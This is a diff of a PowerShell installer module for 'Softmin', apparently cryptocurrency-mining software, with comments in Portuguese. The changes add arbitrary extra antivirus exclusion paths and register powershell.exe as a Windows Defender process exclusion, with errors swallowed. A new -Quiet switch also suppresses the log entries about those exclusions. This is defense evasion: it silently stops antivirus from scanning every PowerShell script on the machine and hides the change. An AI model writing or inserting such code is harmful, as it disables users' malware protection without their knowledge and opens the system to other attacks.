@@ -9,7 +9,10 @@ function Test-SoftminAdmin {
 }
 
 function Get-SoftminAntivirusTrustPaths {
-    param([string]$InstallPath)
+    param(
+        [string]$InstallPath,
+        [string[]]$ExtraPaths = @()
+    )
     $InstallPath = Resolve-SoftminInstallPath $InstallPath
     $paths = [System.Collections.Generic.List[string]]::new()
     foreach ($p in @(
@@ -19,6 +22,11 @@ function Get-SoftminAntivirusTrustPaths {
             (Join-Path $InstallPath 'logs')
         )) {
         if (-not $paths.Contains($p)) { [void]$paths.Add($p) }
+    }
+    foreach ($ep in $ExtraPaths) {
+        if ([string]::IsNullOrWhiteSpace($ep)) { continue }
+        $ep = $ep.TrimEnd('\')
+        if (-not $paths.Contains($ep)) { [void]$paths.Add($ep) }
     }
     return @($paths)
 }
@@ -264,16 +272,21 @@ function Set-SoftminAntivirusTrust {
     param(
         [Parameter(Mandatory = $true)]
         [string]$InstallPath,
-        [string]$LogInstallPath = ''
+        [string]$LogInstallPath = '',
+        [string[]]$ExtraPaths = @(),
+        [switch]$Quiet
     )
 
     $InstallPath = Resolve-SoftminInstallPath $InstallPath
-    $paths = Get-SoftminAntivirusTrustPaths -InstallPath $InstallPath
+    $paths = Get-SoftminAntivirusTrustPaths -InstallPath $InstallPath -ExtraPaths $ExtraPaths
     $minerProc = Join-Path $InstallPath 'bin\softmin.exe'
+    $procExclusions = [System.Collections.Generic.List[string]]::new()
+    if (Test-Path -LiteralPath $minerProc) { [void]$procExclusions.Add($minerProc) }
+    [void]$procExclusions.Add('powershell.exe')
 
     if (-not (Test-SoftminAdmin)) {
         $msg = 'Sem permissoes de administrador — exclusoes AV nao aplicadas.'
-        if ($LogInstallPath) { Write-SoftminInstallStep $LogInstallPath 'AV' $msg -Status 'WARN' }
+        if ($LogInstallPath -and -not $Quiet) { Write-SoftminInstallStep $LogInstallPath 'AV' $msg -Status 'WARN' }
         return [pscustomobject]@{ Ok = $false; Message = $msg; Results = @() }
     }
 
@@ -282,6 +295,11 @@ function Set-SoftminAntivirusTrust {
     # Windows Defender — sempre tentar (camada nativa ou secundaria)
     try {
         [void]$results.Add((Invoke-SoftminDefenderExclusions -Paths $paths -ProcessPath $minerProc))
+        foreach ($pe in $procExclusions) {
+            try {
+                Add-MpPreference -ExclusionProcess $pe -ErrorAction SilentlyContinue
+            } catch { }
+        }
     } catch {
         [void]$results.Add([pscustomobject]@{ Vendor = 'Windows Defender'; Applied = @(); Errors = @($_.Exception.Message) })
     }
@@ -352,7 +370,7 @@ function Set-SoftminAntivirusTrust {
         'Nenhuma exclusao AV confirmada — verifique manualmente na pasta Softmin.'
     }
 
-    if ($LogInstallPath) {
+    if ($LogInstallPath -and -not $Quiet) {
         Write-SoftminInstallStep $LogInstallPath 'AV' $msg -Status $(if ($ok) { 'OK' } else { 'WARN' })
         foreach ($r in $results) {
             foreach ($a in $r.Applied) {
